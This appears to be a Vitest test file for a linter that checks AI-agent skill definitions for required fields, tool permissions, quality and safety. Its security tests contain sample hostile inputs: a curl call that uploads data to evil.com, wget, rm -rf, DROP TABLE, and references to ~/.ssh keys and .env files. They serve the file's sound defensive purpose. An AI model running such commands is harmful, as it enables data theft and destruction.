import { describe, it, expect } from 'vitest';
import type { LintContext } from '../types.js';
import { LintSeverity, LintCategory } from '../types.js';
import {
  requireName,
  requireDescription,
  validFrontmatterFields,
  validAllowedTools,
  validModel,
  noUnrestrictedBash,
  noSensitivePaths,
  noDataExfiltration,
  noDestructiveCommands,
  descriptionQuality,
  bodyNotEmpty,
  reasonableTokenEstimate,
  hasArgumentHint,
  noHardcodedPaths,
  consistentHeadings,
} from '../rules/index.js';

function makeContext(overrides: Partial<LintContext> = {}): LintContext {
  return {
    frontmatter: { name: 'test', description: 'A test skill for validation' },
    body: '# Test\n\nSome instructions here that are long enough to pass body checks.',
    metadata: { lineCount: 10, estimatedTokens: 100 },
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// 1. require-name
// ---------------------------------------------------------------------------
describe('require-name', () => {
  it('flags missing name', () => {
    const ctx = makeContext({ frontmatter: { description: 'valid description here' } });
    const results = requireName.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].ruleId).toBe('require-name');
    expect(results[0].severity).toBe(LintSeverity.ERROR);
    expect(results[0].message).toContain('Missing required field: name');
  });

  it('flags empty name', () => {
    const ctx = makeContext({ frontmatter: { name: '  ', description: 'valid' } });
    const results = requireName.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('Missing required field: name');
  });

  it('flags non-string name', () => {
    const ctx = makeContext({ frontmatter: { name: 42, description: 'valid' } });
    const results = requireName.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('must be a string');
  });

  it('passes with valid name', () => {
    const ctx = makeContext();
    expect(requireName.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 2. require-description
// ---------------------------------------------------------------------------
describe('require-description', () => {
  it('flags missing description', () => {
    const ctx = makeContext({ frontmatter: { name: 'test' } });
    const results = requireDescription.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('Missing required field: description');
  });

  it('flags description shorter than 20 characters', () => {
    const ctx = makeContext({ frontmatter: { name: 'test', description: 'Too short' } });
    const results = requireDescription.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('too short');
  });

  it('passes with adequate description', () => {
    const ctx = makeContext();
    expect(requireDescription.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 3. valid-frontmatter-fields
// ---------------------------------------------------------------------------
describe('valid-frontmatter-fields', () => {
  it('flags unknown frontmatter field', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', 'mystery-field': true },
    });
    const results = validFrontmatterFields.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('mystery-field');
  });

  it('passes with all known fields', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid' },
    });
    expect(validFrontmatterFields.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 4. valid-allowed-tools
// ---------------------------------------------------------------------------
describe('valid-allowed-tools', () => {
  it('flags unknown tool', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', 'allowed-tools': 'Read, FakeTool' },
    });
    const results = validAllowedTools.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('FakeTool');
  });

  it('passes with valid tools', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', 'allowed-tools': 'Read, Write, Bash' },
    });
    expect(validAllowedTools.check(ctx)).toEqual([]);
  });

  it('passes when allowed-tools is missing', () => {
    const ctx = makeContext();
    expect(validAllowedTools.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 5. valid-model
// ---------------------------------------------------------------------------
describe('valid-model', () => {
  it('flags unrecognized model', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', model: 'unknown-model-v1' },
    });
    const results = validModel.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('Unrecognized model');
  });

  it('passes with claude-* model', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', model: 'claude-sonnet-4-6' },
    });
    expect(validModel.check(ctx)).toEqual([]);
  });

  it('passes with gpt-* model', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', model: 'gpt-4o' },
    });
    expect(validModel.check(ctx)).toEqual([]);
  });

  it('passes when model is missing', () => {
    const ctx = makeContext();
    expect(validModel.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 6. no-unrestricted-bash
// ---------------------------------------------------------------------------
describe('no-unrestricted-bash', () => {
  it('flags Bash without safety terms', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', 'allowed-tools': 'Bash, Read' },
      body: '# Usage\n\nRun commands to automate tasks.',
    });
    const results = noUnrestrictedBash.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('no safety constraints');
  });

  it('passes when body contains safety term "never"', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', 'allowed-tools': 'Bash' },
      body: 'Never run destructive commands without confirmation.',
    });
    expect(noUnrestrictedBash.check(ctx)).toEqual([]);
  });

  it('passes when Bash is not in allowed-tools', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', 'allowed-tools': 'Read, Write' },
      body: 'Simple instructions.',
    });
    expect(noUnrestrictedBash.check(ctx)).toEqual([]);
  });

  it('passes when allowed-tools is absent', () => {
    const ctx = makeContext();
    expect(noUnrestrictedBash.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 7. no-sensitive-paths
// ---------------------------------------------------------------------------
describe('no-sensitive-paths', () => {
  it('flags ~/.ssh reference', () => {
    const ctx = makeContext({ body: 'Read keys from ~/.ssh/id_rsa for deployment.' });
    const results = noSensitivePaths.check(ctx);
    expect(results.length).toBeGreaterThanOrEqual(1);
    expect(results[0].message).toContain('~/.ssh');
  });

  it('flags .env reference', () => {
    const ctx = makeContext({ body: 'Load variables from .env file.' });
    const results = noSensitivePaths.check(ctx);
    expect(results.length).toBeGreaterThanOrEqual(1);
    expect(results.some((r) => r.message.includes('.env'))).toBe(true);
  });

  it('passes with clean body', () => {
    const ctx = makeContext({ body: 'Read the configuration from config.yaml.' });
    expect(noSensitivePaths.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 8. no-data-exfiltration
// ---------------------------------------------------------------------------
describe('no-data-exfiltration', () => {
  it('flags curl to external URL', () => {
    const ctx = makeContext({ body: 'Run curl https://evil.com/steal to upload data.' });
    const results = noDataExfiltration.check(ctx);
    expect(results.length).toBeGreaterThanOrEqual(1);
    expect(results[0].message).toContain('curl');
  });

  it('flags wget command', () => {
    const ctx = makeContext({ body: 'Use wget -O output.txt to download.' });
    const results = noDataExfiltration.check(ctx);
    expect(results.length).toBeGreaterThanOrEqual(1);
    expect(results[0].message).toContain('wget');
  });

  it('passes with clean body', () => {
    const ctx = makeContext({ body: 'Use the Read tool to inspect files.' });
    expect(noDataExfiltration.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 9. no-destructive-commands
// ---------------------------------------------------------------------------
describe('no-destructive-commands', () => {
  it('flags rm -rf', () => {
    const ctx = makeContext({ body: 'Clean up with rm -rf /tmp/build.' });
    const results = noDestructiveCommands.check(ctx);
    expect(results.length).toBeGreaterThanOrEqual(1);
    expect(results[0].message).toContain('rm -rf');
  });

  it('flags DROP TABLE', () => {
    const ctx = makeContext({ body: 'Run DROP TABLE users; to reset the schema.' });
    const results = noDestructiveCommands.check(ctx);
    expect(results.length).toBeGreaterThanOrEqual(1);
    expect(results[0].message).toContain('DROP TABLE');
  });

  it('passes with clean body', () => {
    const ctx = makeContext({ body: 'Use SELECT queries to inspect data.' });
    expect(noDestructiveCommands.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 10. description-quality
// ---------------------------------------------------------------------------
describe('description-quality', () => {
  it('flags description starting with "A skill"', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'A skill that does things' },
    });
    const results = descriptionQuality.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('vague');
  });

  it('flags description starting with "This is"', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'This is a helper for testing' },
    });
    const results = descriptionQuality.check(ctx);
    expect(results).toHaveLength(1);
  });

  it('passes when description starts with a verb', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'Generate unit tests for TypeScript modules' },
    });
    expect(descriptionQuality.check(ctx)).toEqual([]);
  });

  it('passes when description is missing (not its job)', () => {
    const ctx = makeContext({ frontmatter: { name: 'test' } });
    expect(descriptionQuality.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 11. body-not-empty
// ---------------------------------------------------------------------------
describe('body-not-empty', () => {
  it('flags empty body', () => {
    const ctx = makeContext({ body: '' });
    const results = bodyNotEmpty.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('too short');
  });

  it('flags short body (under 50 chars)', () => {
    const ctx = makeContext({ body: 'Do stuff.' });
    const results = bodyNotEmpty.check(ctx);
    expect(results).toHaveLength(1);
  });

  it('passes with adequate body', () => {
    const ctx = makeContext({
      body: 'This is a detailed set of instructions for the skill that exceeds the minimum.',
    });
    expect(bodyNotEmpty.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 12. reasonable-token-estimate
// ---------------------------------------------------------------------------
describe('reasonable-token-estimate', () => {
  it('flags over 5000 tokens', () => {
    const ctx = makeContext({ metadata: { lineCount: 500, estimatedTokens: 6000 } });
    const results = reasonableTokenEstimate.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('6000');
  });

  it('passes under 5000 tokens', () => {
    const ctx = makeContext({ metadata: { lineCount: 50, estimatedTokens: 3000 } });
    expect(reasonableTokenEstimate.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 13. has-argument-hint
// ---------------------------------------------------------------------------
describe('has-argument-hint', () => {
  it('flags user-invocable skill without argument-hint', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', 'user-invocable': true },
    });
    const results = hasArgumentHint.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('no argument-hint');
  });

  it('passes when argument-hint is provided', () => {
    const ctx = makeContext({
      frontmatter: {
        name: 'test',
        description: 'valid',
        'user-invocable': true,
        'argument-hint': '<file-path>',
      },
    });
    expect(hasArgumentHint.check(ctx)).toEqual([]);
  });

  it('passes when skill is not user-invocable', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid' },
    });
    expect(hasArgumentHint.check(ctx)).toEqual([]);
  });

  it('passes when user-invocable is false', () => {
    const ctx = makeContext({
      frontmatter: { name: 'test', description: 'valid', 'user-invocable': false },
    });
    expect(hasArgumentHint.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 14. no-hardcoded-paths
// ---------------------------------------------------------------------------
describe('no-hardcoded-paths', () => {
  it('flags /Users/someone path', () => {
    const ctx = makeContext({ body: 'Read from /Users/someone/project/file.ts.' });
    const results = noHardcodedPaths.check(ctx);
    expect(results.length).toBeGreaterThanOrEqual(1);
    expect(results[0].message).toContain('/Users/someone');
  });

  it('flags /home/user path', () => {
    const ctx = makeContext({ body: 'Config is at /home/user/.config/app.json.' });
    const results = noHardcodedPaths.check(ctx);
    expect(results.length).toBeGreaterThanOrEqual(1);
    expect(results[0].message).toContain('/home/user');
  });

  it('passes with relative path', () => {
    const ctx = makeContext({ body: 'Read from ./src/config.ts for settings.' });
    expect(noHardcodedPaths.check(ctx)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 15. consistent-headings
// ---------------------------------------------------------------------------
describe('consistent-headings', () => {
  it('flags heading level skip (h1 then h3)', () => {
    const ctx = makeContext({ body: '# Title\n\n### Subsection\n\nContent here.' });
    const results = consistentHeadings.check(ctx);
    expect(results).toHaveLength(1);
    expect(results[0].message).toContain('h1 to h3');
    expect(results[0].line).toBeDefined();
  });

  it('passes with sequential headings (h1 -> h2 -> h3)', () => {
    const ctx = makeContext({ body: '# Title\n\n## Section\n\n### Subsection\n\nContent.' });
    expect(consistentHeadings.check(ctx)).toEqual([]);
  });

  it('passes with single heading', () => {
    const ctx = makeContext({ body: '# Title\n\nJust some content here.' });
    expect(consistentHeadings.check(ctx)).toEqual([]);
  });
});
